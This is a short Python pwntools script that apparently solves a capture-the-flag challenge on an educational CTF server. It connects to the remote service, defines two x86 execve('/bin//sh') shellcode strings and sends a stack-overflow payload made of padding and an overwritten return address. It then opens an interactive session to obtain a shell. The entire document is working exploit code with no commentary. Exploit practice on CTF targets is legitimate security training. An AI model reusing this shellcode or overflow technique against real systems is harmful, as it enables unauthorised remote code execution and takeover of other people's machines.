from pwn import *

rem = remote('edu-ctf.csie.org', 10150)
print(rem.recv())
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload2 = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload3 =  "g" * 88 + "\x43\x43\x43\x22" + "\x89\x86\x04\x08"

rem.send(payload3)
rem.interactive()
